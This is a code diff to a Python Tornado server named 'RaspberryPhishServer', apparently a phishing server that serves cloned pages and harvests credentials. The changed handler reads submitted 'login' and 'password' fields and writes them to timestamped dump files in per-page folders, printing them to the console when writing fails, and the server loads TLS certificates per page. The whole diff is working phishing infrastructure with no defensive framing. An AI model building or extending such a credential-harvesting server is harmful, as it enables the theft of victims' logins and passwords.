@@ -2,15 +2,14 @@
 # -*- coding: utf-8 -*-
 __title__ = "RaspberryPhishServer"
 
-# var : directory name where the server will load in "pages" and "rsc"
-pagePath = "test/"
-
-
 import tornado.ioloop
 import tornado.web
-import os.path
+import os
 import ssl
 import time
+
+# var : directory name where the server will load in "pages" and "rsc"
+pagePath = "test/"
 
 
 # Handler for ressources
@@ -28,12 +27,14 @@ class MainHandler(tornado.web.RequestHandler):
         try:
             login = self.get_argument("login")
             password = self.get_argument("password")
-            name = time.time()
             try:
-                file = open("logs/dump/"+str(name), mode="a+")
+                if not os.path.exists("logs/dump/" + pagePath):
+                    os.mkdir("logs/dump/" + pagePath)
+                file = open("logs/dump/" + pagePath + str(time.time()), mode="a+")
                 file.write("login:" + login + "\npassword:" + password)
                 file.close()
             except IOError:
+                print(pagePath)
                 print("login :", login)
                 print("password :", password)
         except tornado.web.HTTPError:
@@ -54,7 +55,7 @@ if __name__ == "__main__":
     )   # create an instance
 
     if(os.path.isfile("cert/" + pagePath + "default.key") and
-           os.path.isfile("cert/" + pagePath + "default.cert")):
+       os.path.isfile("cert/" + pagePath + "default.cert")):
         ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         ssl_ctx.load_cert_chain("cert/" + pagePath + "default.cert",
                                 "cert/" + pagePath + "default.key",)
